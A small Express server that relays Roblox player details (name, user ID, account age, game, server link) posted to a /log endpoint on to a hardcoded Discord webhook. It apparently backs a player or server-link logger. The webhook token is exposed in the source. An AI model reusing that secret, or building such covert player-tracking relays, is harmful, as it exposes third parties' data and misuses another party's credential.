const express = require("express");
const fetch = require("node-fetch");

const app = express();
app.use(express.json());

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1457116012490264626/uKtDP7Ru3QvqrBFz-klP2IFCcHn3LZ2u1PQ8BOLYAO_uHiRBNMLlPLovc-CbNbcgYS9j";

app.post("/log", async (req, res) => {
    const data = req.body;

    const embed = {
        title: "📡 New Roblox Server Link Logged",
        color: 0xff4c4c,
        fields: [
            { name: "👤 Player", value: data.playerName, inline: true },
            { name: "🆔 UserId", value: data.userId.toString(), inline: true },
            { name: "📆 Account Age", value: data.accountAge + " days", inline: true },
            { name: "🎮 Game", value: data.gameName || "Unknown", inline: false },
            { name: "🔗 Server Link", value: data.serverLink, inline: false },
            { name: "⏰ Time", value: `<t:${data.time}:F>`, inline: false }
        ]
    };

    await fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] })
    });

    res.json({ success: true });
});

app.listen(3000, () => console.log("Bot running"));
